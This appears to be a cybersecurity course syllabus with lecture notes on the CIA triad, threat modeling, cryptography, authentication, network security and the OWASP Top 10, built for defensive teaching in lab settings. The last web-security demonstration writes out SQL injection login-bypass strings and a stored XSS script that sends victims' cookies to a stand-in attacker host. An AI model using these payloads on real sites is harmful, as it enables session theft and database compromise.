class_schedule.topic: Security Fundamentals and the CIA Triad
learning_objectives: Define confidentiality, integrity, and availability and explain how security controls protect each property
Identify common threat actors (nation-states, organized crime, insiders, hacktivists) and their motivations
Apply risk assessment frameworks: risk = likelihood x impact, risk acceptance, transference, mitigation, and avoidance
Understand defense in depth and the zero-trust security model
readings: Stallings, Computer Security: Principles and Practice, 4th Ed., Ch. 1
NIST Cybersecurity Framework v2.0 Overview
MITRE ATT&CK Framework Introduction

lecture_notes.introduction: Every system you build will be attacked. Cybersecurity is not an add-on feature; it is a fundamental design consideration that must be baked into every layer of your system from the start. The CIA triad -- confidentiality (only authorized access), integrity (data is accurate and unmodified), and availability (systems are accessible when needed) -- provides the framework for reasoning about security. Every attack violates one or more of these properties, and every defense protects one or more. This course teaches you to think like an attacker so you can build defenses that actually work. We will cover the full spectrum of cybersecurity: cryptography (the mathematical foundation), authentication and access control (who gets in and what they can do), network security (protecting data in transit), web security (defending the most attacked surface), software security (writing code that resists exploitation), and incident response (what to do when defenses fail). The threat landscape evolves constantly -- nation-states develop sophisticated supply chain attacks, organized crime runs ransomware-as-a-service operations, and AI-powered attacks are becoming more prevalent. A security professional must understand both the timeless principles (defense in depth, least privilege, secure by default) and the current threat landscape to build effective defenses.
key_concepts: Confidentiality: ensuring that information is accessible only to authorized parties; protected by encryption, access controls, and data classification; violated by data breaches, eavesdropping, and unauthorized disclosure

Integrity: ensuring that data is accurate, complete, and unmodified by unauthorized parties; protected by hashing, digital signatures, and version control; violated by tampering, man-in-the-middle attacks, and data corruption

Availability: ensuring that systems and data are accessible when needed by authorized users; protected by redundancy, load balancing, and DDoS mitigation; violated by denial-of-service attacks, ransomware, and system failures

Risk assessment: Risk = Likelihood x Impact; qualitative (low/medium/high) or quantitative (annualized loss expectancy = single loss expectancy x annual rate of occurrence); risk responses: accept, mitigate, transfer (insurance), or avoid

Defense in depth: no single control is sufficient; layer defenses (perimeter firewall, network segmentation, host intrusion detection, application security, data encryption, user training) so that bypassing one layer does not compromise the system

Zero trust model: never trust, always verify; assume the network is compromised; authenticate and authorize every request regardless of source; micro-segmentation and continuous verification replace perimeter-based security

Threat actors: nation-states (espionage, sabotage; APT groups like Cozy Bear, Fancy Bear), organized crime (ransomware, financial fraud; REvil, Conti), insiders (disgruntled employees, negligent users), hacktivists (ideological motivation; Anonymous), script kiddies (unskilled attackers using existing tools)

The MITRE ATT&CK framework: a knowledge base of adversary tactics, techniques, and procedures (TTPs) organized by attack phase; used for threat modeling, detection engineering, and security assessment
Security mindset: assume breach, verify everything, minimize attack surface, apply least privilege, fail securely (deny access by default), and log everything for detection and forensics
Compliance frameworks: NIST CSF, ISO 27001, SOC 2, PCI DSS, HIPAA; regulatory requirements drive minimum security standards but compliance is not security -- it is the floor, not the ceiling
lecture_notes.demonstration: Walk through a detailed case study of the SolarWinds supply chain attack (2020): (1) How attackers compromised the build system to inject a backdoor into a signed software update, (2) How the backdoor evaded detection for months by mimicking legitimate traffic, (3) Which CIA properties were violated (confidentiality of government secrets, integrity of the software supply chain), (4) What defenses failed (code signing without build verification, insufficient network monitoring, excessive trust in vendor software), and (5) What improvements were recommended (software bill of materials, build reproducibility, zero-trust for internal networks). Students identify the MITRE ATT&CK techniques used at each stage.
setup_requirements: Kali Linux VM or similar security-focused distribution installed
Access to the course CTF (Capture the Flag) platform
VPN access to the isolated lab network

review.value: For a hospital records system: Confidentiality = only authorized doctors/nurses access patient records (HIPAA); Integrity = lab results cannot be altered in transit or at rest; Availability = the system must be accessible 24/7 for emergency care. Each property requires different controls: encryption for C, digital signatures for I, redundancy and failover for A.

To protect a web application: perimeter firewall blocks known bad IPs, WAF filters malicious requests, TLS encrypts data in transit, parameterized queries prevent SQL injection, RBAC limits what authenticated users can do, database encryption protects data at rest, logging and monitoring detect anomalies, backups enable recovery. Bypassing any single layer does not give full access.

A company's customer database (10M records, $150/record breach cost) faces a 5% annual probability of breach. Annual Loss Expectancy = $150 * 10M * 0.05 = $75M. If a $2M security investment reduces breach probability to 1%, new ALE = $15M, saving $60M/year -- clearly justified.

Traditional perimeter security trusts everything inside the network. Zero trust assumes the network is already compromised: every request is authenticated, authorized, and encrypted regardless of source. This model prevents lateral movement by attackers who breach the perimeter.

learning_objectives: Apply the STRIDE threat model to identify threats in a system architecture
Create threat models using data flow diagrams (DFDs) with trust boundaries
Prioritize threats using DREAD scoring and attack trees
Design security architectures that address identified threats with appropriate controls
readings: Shostack, 'Threat Modeling: Designing for Security', Ch. 1-5
OWASP Threat Modeling Cheat Sheet
Microsoft SDL Threat Modeling Tool documentation

lecture_notes.introduction: Before you can defend a system, you must understand what you are defending and what threats it faces. Threat modeling is the systematic process of identifying security threats to a system, evaluating their severity, and designing mitigations. It is most effective when done during the design phase, before any code is written, because architectural changes are cheap at design time and extremely expensive after deployment. The STRIDE model (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) provides a structured vocabulary for identifying threats against each component of your system. Data flow diagrams with trust boundaries visualize where data crosses security boundaries and where threats are most likely. Attack trees decompose complex threats into combinations of simpler attack steps, revealing the paths an attacker might take. Threat modeling is not a one-time activity -- it must be revisited whenever the system architecture changes, new features are added, or the threat landscape evolves. Companies that integrate threat modeling into their development process (Microsoft's SDL, Google's design review) consistently produce more secure software than those that rely solely on testing and penetration testing after the fact.
key_concepts: STRIDE threat categories: Spoofing (pretending to be someone else), Tampering (modifying data or code), Repudiation (denying an action occurred), Information disclosure (exposing data to unauthorized parties), Denial of service (making a system unavailable), Elevation of privilege (gaining unauthorized access levels)

Data flow diagrams (DFDs): visual representations showing processes, data stores, external entities, and data flows; trust boundaries separate zones of different privilege levels (internet vs DMZ vs internal network vs database)

Applying STRIDE to DFD elements: external entities are subject to spoofing, data flows to tampering and information disclosure, data stores to tampering and information disclosure, processes to all six threats

DREAD scoring: Damage potential (how bad?), Reproducibility (how easy to reproduce?), Exploitability (how easy to exploit?), Affected users (how many?), Discoverability (how easy to find?); score each 1-10 and average for priority ranking

Attack trees: hierarchical decomposition of an attack goal into sub-goals connected by AND (all must succeed) and OR (any suffices); leaf nodes are atomic attack steps that can be individually assessed for cost and difficulty
Threat prioritization: high-impact + high-likelihood threats are addressed first; some threats are accepted if mitigation cost exceeds the expected loss

Security architecture patterns: defense in depth (layered controls), least privilege (minimal access needed), separation of duties (no single person can complete a critical action alone), fail-safe defaults (deny access unless explicitly granted), economy of mechanism (simpler systems have fewer vulnerabilities)

Secure design principles: minimize attack surface (disable unused features, close unnecessary ports), validate all input (never trust external data), authenticate and authorize every request, encrypt sensitive data in transit and at rest, log security-relevant events for detection and forensics

Security controls mapping: for each identified threat, map to specific technical controls (encryption, authentication, input validation), administrative controls (policies, training), and physical controls (access badges, locked server rooms)
lecture_notes.demonstration: Threat model a real web application architecture: a React frontend communicating with a Node.js API server, which connects to a PostgreSQL database and a Redis cache, behind an Nginx reverse proxy. (1) Draw the DFD with trust boundaries (internet, DMZ, application zone, data zone). (2) Apply STRIDE to each component and data flow: identify 15+ threats including API spoofing (missing auth), database injection (untrusted input), session tampering (insecure cookies), information disclosure (error messages leaking stack traces), DoS (no rate limiting), and privilege escalation (IDOR vulnerabilities). (3) Score each with DREAD and prioritize. (4) Design mitigations for the top 5 threats. Students identify additional threats the instructor deliberately missed.
setup_requirements: Threat modeling diagramming tool (draw.io, Microsoft Threat Modeling Tool, or OWASP Threat Dragon)

review.value: For a login API endpoint: Spoofing -- attacker sends requests with stolen credentials; Tampering -- modifying the login request in transit (MITM); Repudiation -- user denies they logged in at a specific time; Information Disclosure -- error messages reveal whether the username exists; DoS -- brute force login attempts overload the server; Elevation of Privilege -- SQL injection in login grants admin access.

Data crossing a trust boundary is the most dangerous moment in a system. When user input crosses from the internet to the application, it must be validated. When the application sends a query to the database, it must be parameterized. When the server sends a response to the client, it must not include sensitive internal details. Every trust boundary crossing requires a security control.

Goal: Take over user account. OR branches: (1) Guess password (brute force, dictionary attack, credential stuffing), (2) Steal password (phishing, keylogger, database breach), (3) Bypass authentication (session hijacking, OAuth misconfiguration, password reset flaw), (4) Social engineering (convince support to reset password). Each leaf can be assessed for difficulty and cost to the attacker.

Threat model during design (before coding), when adding new features, when changing architecture, when integrating third-party services, and after a security incident. The earlier threats are found, the cheaper they are to fix. A design flaw found in threat modeling costs 10x less to fix than one found in production.

learning_objectives: Explain how symmetric encryption works at a conceptual and algorithmic level
Understand AES (Advanced Encryption Standard) operation modes: ECB, CBC, CTR, and GCM
Apply hash functions (SHA-256) for integrity verification and understand collision resistance
Implement file encryption and integrity verification using command-line tools
readings: Stallings, Ch. 2 -- Symmetric Encryption and Message Confidentiality
Schneier, Applied Cryptography, Ch. 7-12 (selected sections on block ciphers)
NIST SP 800-38A: Recommendation for Block Cipher Modes of Operation

lecture_notes.introduction: Cryptography is the mathematical foundation of information security. Without cryptography, there is no confidentiality (anyone can read your data), no integrity verification (anyone can modify your data without detection), and no authentication (anyone can impersonate anyone else). Symmetric encryption uses a single shared secret key for both encryption and decryption. It is fast (AES-256 encrypts gigabytes per second on modern hardware) and is used to protect data in transit (TLS encrypts every HTTPS connection) and at rest (disk encryption protects laptops and servers). The Advanced Encryption Standard (AES) is the workhorse of modern cryptography -- it protects everything from your bank transactions to classified government communications. Understanding AES operation modes is critical because the same algorithm used in different modes can be secure (AES-GCM) or catastrophically insecure (AES-ECB). Hash functions complement encryption by providing integrity verification: a hash is a fixed-size fingerprint of data that changes dramatically if even a single bit of the input changes. SHA-256 is used in digital signatures, password storage, blockchain, and software integrity verification. This session covers the principles of symmetric cryptography and hash functions, giving you the foundation to use these tools correctly and recognize when they are being misused.
key_concepts: Symmetric encryption: the same key K encrypts plaintext P to ciphertext C = E(K, P) and decrypts C back to P = D(K, C); the key must be kept secret and shared securely between communicating parties

AES (Advanced Encryption Standard): a block cipher that encrypts 128-bit blocks using 128, 192, or 256-bit keys; 10/12/14 rounds of substitution, permutation, mixing, and key addition; selected by NIST in 2001 after a public competition

ECB mode (Electronic Codebook): encrypts each block independently; identical plaintext blocks produce identical ciphertext blocks; NEVER use for encrypting data longer than one block because patterns in the plaintext are visible in the ciphertext (the 'ECB penguin' example)

CBC mode (Cipher Block Chaining): XORs each plaintext block with the previous ciphertext block before encryption; requires a random Initialization Vector (IV) for the first block; hides patterns but is sequential (cannot parallelize encryption)

CTR mode (Counter): encrypts a counter value and XORs the result with plaintext; converts a block cipher into a stream cipher; fully parallelizable for both encryption and decryption; requires a unique nonce for each message

GCM mode (Galois/Counter Mode): CTR mode plus a polynomial hash for authentication; provides both confidentiality and integrity (authenticated encryption); the recommended mode for most applications; used in TLS 1.3

Hash functions: deterministic functions mapping arbitrary-length input to a fixed-length output (digest); SHA-256 produces a 256-bit (32-byte) hash; properties: pre-image resistance (given h, hard to find m such that H(m) = h), second pre-image resistance (given m1, hard to find m2 with H(m1) = H(m2)), collision resistance (hard to find any m1, m2 with H(m1) = H(m2))

HMAC (Hash-based Message Authentication Code): combines a hash function with a secret key to provide both integrity and authentication; HMAC(K, M) = H(K XOR opad || H(K XOR ipad || M)); used in TLS, API authentication, and JWT tokens

Key length guidance: AES-128 provides 128 bits of security (sufficient for most current applications); AES-256 provides 256 bits (required for quantum-resistant symmetric encryption and classified data); SHA-256 provides 128 bits of collision resistance
lecture_notes.demonstration: Use OpenSSL command-line tools to: (1) Generate a random 256-bit AES key. (2) Encrypt a file with AES-256-ECB and AES-256-CBC, then compare the ciphertext -- show that ECB reveals patterns in a BMP image (the ECB penguin) while CBC produces random-looking output. (3) Encrypt the same file twice with CBC using different IVs, showing different ciphertext each time. (4) Compute SHA-256 hash of a file, modify one byte, recompute -- the hash changes completely (avalanche effect). (5) Demonstrate AES-256-GCM encrypting and authenticating a message, then show that modifying the ciphertext causes authentication failure on decryption.
setup_requirements: Sample files including a BMP image for the ECB penguin demonstration

review.value: A cryptographic system should be secure even if everything about the system except the key is public knowledge. Security through obscurity (hiding the algorithm) is not security -- the algorithm will eventually be reverse-engineered. AES has been publicly known since 2001 and remains unbroken because the security rests entirely in the key.

ECB encrypts identical plaintext blocks to identical ciphertext blocks. For an image, this means areas of the same color produce the same ciphertext, revealing the image structure even when encrypted. This is not a theoretical concern -- it has been exploited in real attacks against protocols that used ECB mode.

In CTR/GCM mode, if the same nonce is used with the same key for two different messages, the XOR of the two ciphertexts equals the XOR of the two plaintexts, revealing information about both messages. In GCM, nonce reuse also allows forging authentication tags. This is why nonces must be unique (use a counter or random 96-bit value).

Encryption alone provides confidentiality but not integrity. An attacker can flip bits in the ciphertext, causing predictable changes in the decrypted plaintext (bit-flipping attack). Authenticated encryption (AES-GCM, ChaCha20-Poly1305) detects any modification, rejecting tampered ciphertext.

learning_objectives: Understand RSA key generation, encryption, and digital signatures at a conceptual level
Explain Diffie-Hellman key exchange and its role in establishing shared secrets
Apply elliptic curve cryptography (ECC) and compare key sizes with RSA
Implement a complete TLS-like handshake sequence showing how asymmetric and symmetric cryptography work together
readings: Stallings, Ch. 3 -- Public-Key Cryptography and Message Authentication
Diffie and Hellman, 'New Directions in Cryptography' (1976)
Barker, 'Recommendation for Key Management' (NIST SP 800-57)

lecture_notes.introduction: Symmetric encryption requires a shared secret key -- but how do two parties who have never met establish a shared secret over an insecure channel? Public-key (asymmetric) cryptography solves this fundamental problem by using key pairs: a public key that anyone can know, and a private key that only the owner possesses. RSA encryption uses the public key to encrypt and the private key to decrypt; RSA signatures use the private key to sign and the public key to verify. Diffie-Hellman key exchange allows two parties to agree on a shared secret over a public channel without ever transmitting the secret. These inventions, published in the 1970s, are among the most important in the history of computer science -- they enable secure communication over the internet, digital signatures for authentication and non-repudiation, and certificate-based trust that underpins the entire PKI (Public Key Infrastructure) system. Modern systems use elliptic curve cryptography (ECC), which provides the same security as RSA with much smaller keys (256-bit ECC is roughly equivalent to 3072-bit RSA), making it faster and more suitable for constrained devices. TLS (Transport Layer Security), the protocol that secures every HTTPS connection, combines all these primitives: asymmetric cryptography for key exchange and authentication, symmetric encryption for bulk data protection, and hash functions for integrity verification.
key_concepts: Asymmetric cryptography: a key pair (public key PK, private key SK) where data encrypted with PK can only be decrypted with SK, and data signed with SK can be verified with PK; fundamentally different from symmetric encryption where the same key does both

RSA algorithm: generate two large primes p, q; compute n = p*q and phi(n) = (p-1)(q-1); choose public exponent e (typically 65537); compute private exponent d = e^(-1) mod phi(n); encrypt: c = m^e mod n; decrypt: m = c^d mod n; security rests on the difficulty of factoring n

Digital signatures: sign a message by computing signature = hash(message)^d mod n using the private key; verify by computing hash(message) and checking that signature^e mod n matches; provides authentication (who signed), integrity (message unchanged), and non-repudiation (signer cannot deny)

Diffie-Hellman key exchange: Alice and Bob agree on public parameters (prime p, generator g); Alice picks secret a, sends g^a mod p; Bob picks secret b, sends g^b mod p; both compute shared secret g^(ab) mod p; an eavesdropper who sees g^a and g^b cannot compute g^(ab) (discrete logarithm problem)

Elliptic curve cryptography (ECC): uses the algebraic structure of elliptic curves over finite fields; ECDH for key exchange, ECDSA for signatures; 256-bit ECC provides equivalent security to 3072-bit RSA with smaller keys, faster operations, and less bandwidth

Certificate authorities (CAs) and PKI: a CA issues digital certificates binding a public key to an identity; the browser trusts a root CA, which trusts intermediate CAs, forming a chain of trust; if a CA is compromised, all certificates it issued are suspect

TLS 1.3 handshake: (1) Client sends ClientHello with supported cipher suites and key share. (2) Server selects cipher suite, sends ServerHello with key share, encrypted certificate and signature. (3) Both derive shared secret via ECDHE. (4) All subsequent data encrypted with AES-GCM using the shared secret. Only 1 round-trip (0-RTT with session resumption)

Key size recommendations: RSA-2048 minimum for new systems (RSA-4096 for long-term security); ECDSA P-256 for standard use, P-384 for higher security; AES-128 for symmetric, AES-256 for post-quantum margin

Post-quantum cryptography: RSA and ECC are broken by Shor's algorithm on a sufficiently large quantum computer; NIST has standardized post-quantum algorithms (CRYSTALS-Kyber for key exchange, CRYSTALS-Dilithium for signatures); hybrid schemes using both classical and post-quantum algorithms are being deployed now
lecture_notes.demonstration: Simulate a complete TLS-like secure communication setup: (1) Generate RSA key pairs for both Alice and Bob using OpenSSL. (2) Alice signs a message with her private key; Bob verifies with her public key -- demonstrate that modifying the message invalidates the signature. (3) Perform Diffie-Hellman key exchange in Python: both parties compute the same shared secret without ever transmitting it. (4) Use the shared secret as an AES-256-GCM key to encrypt a conversation. (5) Walk through a TLS 1.3 handshake capture in Wireshark, identifying each message and its cryptographic purpose. (6) Compare RSA-2048 and ECDSA-P256 key generation and signing speed to show ECC's performance advantage.
setup_requirements: Wireshark with a pre-captured TLS 1.3 handshake
Key generation and signing benchmark scripts

review.value: RSA security rests on the assumption that factoring the product of two large primes is computationally infeasible. The best known classical algorithm (General Number Field Sieve) takes sub-exponential time. A 2048-bit RSA key would take billions of years to factor with current technology, but a sufficiently large quantum computer running Shor's algorithm could factor it in hours.

Asymmetric encryption is 1000x slower than symmetric encryption. RSA-2048 encrypts about 1 KB/s; AES-256 encrypts 1 GB/s. TLS uses asymmetric crypto only for the initial key exchange (a few hundred bytes), then switches to symmetric encryption for all subsequent data. This combines asymmetric's key distribution advantage with symmetric's speed.

A mobile app can pin the expected server certificate or CA, rejecting any other certificate even if it is signed by a trusted CA. This prevents attacks where a compromised or malicious CA issues a fake certificate for your domain. However, pinning makes certificate rotation harder and can cause outages if not managed carefully.

If the server's private key is compromised, can an attacker decrypt recorded past traffic? With static RSA key exchange, yes -- all past sessions are compromised. With ephemeral Diffie-Hellman (DHE/ECDHE), each session uses a unique key pair that is discarded after the session ends, so past traffic remains secure even if the long-term key is later compromised. TLS 1.3 requires forward secrecy.

learning_objectives: Design secure authentication systems with multi-factor authentication
Implement secure password storage using bcrypt, scrypt, or Argon2
Compare RBAC, ABAC, and capability-based access control models
Understand OAuth 2.0 and OpenID Connect flows for delegated authentication
readings: Stallings, Ch. 4 -- Authentication and Access Control
OAuth 2.0 RFC 6749 (simplified overview)
NIST SP 800-63B: Digital Identity Guidelines -- Authentication and Lifecycle Management

lecture_notes.introduction: Authentication answers 'Who are you?' and authorization answers 'What can you do?' Getting these wrong is the single most common cause of security breaches. Weak passwords, missing multi-factor authentication, broken session management, and excessive permissions account for the majority of successful attacks. Authentication factors fall into three categories: knowledge (passwords, PINs), possession (phones, hardware tokens), and inherence (biometrics). Multi-factor authentication combining two different categories dramatically reduces compromise risk because an attacker must steal multiple independent secrets. Password storage is equally critical -- storing passwords in plaintext or using fast hash functions (SHA-256) enables attackers who breach the database to crack millions of passwords per second. Purpose-built password hashing functions (bcrypt, scrypt, Argon2) are deliberately slow and memory-hard, making brute-force attacks impractical even with powerful hardware. Access control determines what authenticated users can do. Role-based access control (RBAC) assigns permissions to roles that users occupy; attribute-based access control (ABAC) makes dynamic decisions based on user attributes, resource attributes, and context. Modern systems increasingly use OAuth 2.0 for delegated authorization and OpenID Connect for federated authentication, enabling 'Sign in with Google' flows that avoid the need for applications to manage passwords directly.
key_concepts: Authentication factors: knowledge (password, PIN, security question -- what you know), possession (phone, hardware token, smart card -- what you have), inherence (fingerprint, face, iris -- what you are); multi-factor combines two or more different categories

Password storage: NEVER store plaintext or reversibly encrypted passwords; use bcrypt (cost factor 12+), scrypt (memory-hard), or Argon2 (winner of the Password Hashing Competition, both memory and compute hard); each hash includes a random salt preventing rainbow table attacks

bcrypt cost factor: tuned so that hashing takes approximately 250ms on your server; this makes brute-force attacks against stolen hashes impractically slow (at 250ms/hash, trying 1 billion passwords takes 8 years) while keeping login latency acceptable for legitimate users

Multi-factor authentication (MFA): TOTP (Time-based One-Time Password, RFC 6238) generates 6-digit codes from a shared secret and current time; WebAuthn/FIDO2 uses public-key cryptography with hardware tokens; SMS-based 2FA is the weakest (susceptible to SIM swapping) but better than nothing

Session management: after authentication, the server issues a session token (random, unguessable, sufficient entropy); token stored in an HttpOnly, Secure, SameSite cookie; session expires after inactivity timeout and absolute timeout; token rotation on privilege escalation

Role-Based Access Control (RBAC): define roles (admin, editor, viewer), assign permissions to roles, assign users to roles; simple and widely used but struggles with fine-grained or context-dependent access decisions

Attribute-Based Access Control (ABAC): access decisions based on attributes of the user (role, department, clearance), the resource (classification, owner), the action (read, write, delete), and the context (time, location, device); more flexible than RBAC but more complex to manage

OAuth 2.0 authorization code flow: (1) app redirects user to authorization server with client_id, redirect_uri, scope, and code_challenge (PKCE), (2) user authenticates and consents, (3) authorization server redirects back with authorization code, (4) app exchanges code + code_verifier for access token, (5) app uses access token to call API

OpenID Connect (OIDC): an identity layer on top of OAuth 2.0; adds an ID token (JWT) containing user identity claims (name, email, sub); enables 'Sign in with Google/Apple/Microsoft' without the application managing passwords
Principle of Least Privilege: every user, process, and system should have only the minimum access needed to perform its function; limits the blast radius when an account is compromised
lecture_notes.demonstration: Build a complete authentication system: (1) Implement password registration with Argon2 hashing in Python -- show that the hash includes the salt and algorithm parameters, and that hashing takes ~250ms. (2) Implement TOTP-based 2FA: generate a shared secret, display a QR code for the authenticator app, and verify a 6-digit code. (3) Set up OAuth 2.0 login with Google as the identity provider using a Flask application: show the complete authorization code flow with PKCE. (4) Compare password cracking times: SHA-256 (10 billion hashes/second on GPU) vs bcrypt cost 12 (4 hashes/second on GPU) -- a 6-character password falls in 0.002 seconds with SHA-256 vs 7 months with bcrypt.

review.value: SHA-256 on a modern GPU: ~10 billion hashes/second. An 8-character password with uppercase, lowercase, digits (62^8 = 218 trillion combinations) falls in 218T / 10B = 21,800 seconds = 6 hours. bcrypt cost 12 on the same GPU: ~4 hashes/second. Same password: 218T / 4 = 1.7 trillion years. This is why slow hashing is essential.

PKCE (Proof Key for Code Exchange) prevents authorization code interception. The client generates a random code_verifier, computes code_challenge = SHA256(code_verifier), sends the challenge in the authorization request, and proves knowledge of the verifier when exchanging the code for a token. An attacker who intercepts the code cannot exchange it without the verifier.

An attacker sets a known session ID in the victim's browser (via a crafted URL or XSS). When the victim logs in, the server authenticates that session ID, which the attacker already knows. Prevention: always regenerate the session ID after successful authentication, invalidating the old one.

Use RBAC when: roles are well-defined, permissions are static, the organization is hierarchical. Use ABAC when: access depends on context (time of day, location, device), fine-grained per-resource decisions are needed, or the role structure is too complex. Many systems use RBAC for coarse access and ABAC for fine-grained decisions.

learning_objectives: Configure network firewalls with appropriate rules for common architectures
Understand network segmentation, DMZs, and VLANs for defense in depth
Analyze network traffic with Wireshark to detect suspicious activity
Implement VPN tunnels for secure remote access
readings: Stallings, Ch. 9 -- Firewalls and Intrusion Prevention Systems
NIST SP 800-41: Guidelines on Firewalls and Firewall Policy
Bejtlich, 'The Practice of Network Security Monitoring', Ch. 1-3

lecture_notes.introduction: Network security protects data in transit and controls access to network resources. The network is the conduit through which most attacks travel: malware communicates with command-and-control servers, attackers exfiltrate data over the network, and lateral movement within a compromised network enables attackers to reach high-value targets. Firewalls are the first line of network defense, filtering traffic based on rules that specify which source and destination addresses, ports, and protocols are allowed. Modern next-generation firewalls also inspect application-layer content, detecting malicious payloads even in allowed traffic. Network segmentation divides the network into isolated zones, limiting the blast radius of a breach -- an attacker who compromises a web server in the DMZ cannot directly access the database in the internal network. Virtual Private Networks (VPNs) create encrypted tunnels for secure remote access, protecting data from eavesdropping on untrusted networks. Network security monitoring with tools like Wireshark, Zeek, and Suricata provides visibility into network activity, enabling detection of attacks that bypass preventive controls. This session covers the architecture, configuration, and monitoring of network security systems.
key_concepts: Firewall types: packet filter (examines headers, fast but limited), stateful inspection (tracks connection state, filters based on context), application-layer gateway (inspects payload content, can detect application-level attacks), next-generation firewall (combines all three with IPS, URL filtering, and threat intelligence)

Firewall rule structure: source IP/port, destination IP/port, protocol, action (allow/deny/log); rules evaluated in order (first match wins); default deny (block everything not explicitly allowed) is more secure than default allow

Network segmentation: divide the network into zones with different trust levels; DMZ for public-facing servers, internal network for workstations, management network for administration, database zone for data stores; firewalls between zones enforce access policies

VLANs (Virtual LANs): logically segment the physical network; devices in different VLANs cannot communicate without routing through a firewall; reduces broadcast domain size and enables zone-based security policies without separate physical infrastructure

VPN technologies: IPsec (network-layer encryption, site-to-site and remote access), WireGuard (modern, fast, simple), OpenVPN (flexible, widely supported); all create encrypted tunnels protecting data from eavesdropping on untrusted networks

Network Address Translation (NAT): hides internal IP addresses behind a single public IP; provides a mild security benefit (internal hosts are not directly addressable from the internet) but is NOT a substitute for a firewall

Intrusion Detection Systems (IDS): monitor network traffic for suspicious patterns; signature-based (known attack patterns) and anomaly-based (deviations from normal behavior); Suricata and Snort are the most widely used open-source IDS tools

DNS security: DNS is unencrypted by default, enabling DNS spoofing and tracking; DNSSEC adds cryptographic signatures to DNS responses; DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) encrypt DNS queries; DNS sinkholes redirect known malicious domains

Network forensics: Wireshark for packet capture and analysis; Zeek for connection logging and protocol analysis; NetFlow for traffic volume analysis; full packet capture for detailed forensic investigation vs flow data for trend analysis
lecture_notes.demonstration: Build and analyze a three-zone network architecture in a virtual lab. (1) Set up iptables firewall rules for a web server in the DMZ: allow HTTP/HTTPS from internet, allow database connections from DMZ to internal network, deny all other traffic. (2) Test the rules: demonstrate that HTTP works but SSH from the internet to the DMZ is blocked. (3) Capture traffic with Wireshark during a simulated attack: identify a port scan (sequential SYN packets to different ports), an SQL injection attempt visible in HTTP traffic, and command-and-control beaconing (periodic connections to a suspicious IP). (4) Set up a WireGuard VPN tunnel and verify that traffic is encrypted by capturing the tunnel packets.
setup_requirements: Virtual lab with at least 3 VMs (attacker, web server, internal server)
iptables or nftables for firewall configuration

review.value: A firewall should block all traffic by default and only allow explicitly needed connections. Starting from 'allow all' and adding deny rules is dangerous because you will inevitably miss something. Starting from 'deny all' and adding allow rules means any forgotten rule results in a blocked (safe) connection, not an exposed service.

The DMZ sits between two firewalls: the external firewall allows internet traffic to reach DMZ servers, and the internal firewall restricts DMZ servers from accessing internal resources. If a DMZ server is compromised, the attacker cannot directly reach the internal network. The DMZ hosts web servers, email servers, and DNS servers -- services that must be internet-accessible.

A port scan sends connection attempts to many ports on a target. Detection: multiple SYN packets from the same source to different ports within a short time window. Nmap scan types: SYN scan (-sS, stealthiest), connect scan (-sT, completes TCP handshake), UDP scan (-sU, slower), and version detection (-sV, identifies running services).

Split tunneling routes only corporate traffic through the VPN, sending personal traffic directly to the internet. This is faster but creates a risk: if the user's device is compromised, the attacker can pivot from the device (connected to the corporate network via VPN) to internal resources without going through the VPN's security controls.

class_schedule.topic: Web Security and the OWASP Top 10
learning_objectives: Identify and exploit the OWASP Top 10 web vulnerabilities: injection, broken auth, XSS, CSRF, and others
Implement server-side defenses for each vulnerability class
Use Burp Suite to intercept, modify, and replay web requests
Perform a basic web application security assessment
readings: OWASP Top 10 (2021 edition)
PortSwigger Web Security Academy: SQL Injection, XSS, and CSRF modules
OWASP Testing Guide v4

lecture_notes.introduction: Web applications are the most attacked surface in most organizations because they are internet-facing, complex, and handle sensitive data. The OWASP Top 10 catalogs the most critical web application security risks based on real-world breach data and expert analysis. SQL injection allows attackers to manipulate database queries through unsanitized input, potentially extracting the entire database, modifying data, or gaining administrative access. Cross-site scripting (XSS) enables attackers to inject malicious scripts into web pages viewed by other users, stealing session cookies, redirecting users, or defacing the site. Cross-site request forgery (CSRF) tricks authenticated users into performing unintended actions. These vulnerabilities exist because developers trust user input, fail to enforce proper output encoding, or neglect to verify the origin of requests. Every one of these vulnerabilities is preventable with known techniques -- parameterized queries for injection, output encoding for XSS, CSRF tokens for CSRF -- yet they persist because developers are not trained to think adversarially about their code. This session teaches you to exploit these vulnerabilities (to understand the attacker's perspective) and then implement defenses that actually work.
key_concepts: SQL injection: manipulating database queries by injecting SQL code through user input; example: username = ' OR '1'='1' -- makes the WHERE clause always true; defense: parameterized queries (prepared statements) that separate SQL code from data

Cross-site scripting (XSS): injecting malicious JavaScript into web pages; Stored XSS (script saved in database, executed when any user views the page), Reflected XSS (script in URL, executed when victim clicks a crafted link), DOM-based XSS (client-side script processes untrusted data); defense: output encoding (HTML entities), Content Security Policy (CSP) headers

Cross-site request forgery (CSRF): tricking an authenticated user into making an unintended request; attacker hosts a page that sends a request to the target site using the victim's cookies; defense: CSRF tokens (unique per-session random values included in forms and validated on the server), SameSite cookies

Broken authentication: weak passwords, credential stuffing (using breached passwords from other sites), session fixation, insufficient session expiration; defense: strong password policies, MFA, secure session management, rate limiting login attempts

Insecure direct object references (IDOR): accessing another user's data by modifying a parameter (changing user_id=123 to user_id=456 in the URL); defense: always verify that the authenticated user has permission to access the requested resource (authorization check, not just authentication)

Security misconfiguration: default credentials, unnecessary services enabled, verbose error messages exposing stack traces, missing security headers; defense: automated security configuration scanning, principle of least functionality (disable everything not needed)

Server-side request forgery (SSRF): tricking the server into making requests to internal resources; attacker provides a URL that the server fetches, accessing internal services that are not internet-accessible; defense: allowlist of permitted URLs, disable internal IP range requests

Content Security Policy (CSP): HTTP header that tells the browser which sources of scripts, styles, images, and other resources are trusted; even if XSS is injected, CSP prevents execution of unauthorized scripts; example: Content-Security-Policy: script-src 'self' cdn.example.com

Security headers: X-Frame-Options (prevent clickjacking), X-Content-Type-Options: nosniff (prevent MIME type sniffing), Strict-Transport-Security (force HTTPS), Referrer-Policy (control referrer information); all should be set on every response
lecture_notes.demonstration: Using DVWA (Damn Vulnerable Web Application): (1) SQL Injection: exploit a login form to bypass authentication ('OR 1=1 --), then extract the users table using UNION SELECT. Show the parameterized query fix and verify the attack no longer works. (2) Stored XSS: inject <script>document.location='http://attacker/steal?c='+document.cookie</script> into a guestbook, stealing session cookies of other users. Show the output encoding fix. (3) CSRF: create an HTML page that submits a password change request using the victim's session. Show the CSRF token defense. (4) Walk through Burp Suite: intercept a login request, modify parameters, replay it, and demonstrate how request manipulation enables all these attacks.
setup_requirements: DVWA or WebGoat installed in a Docker container
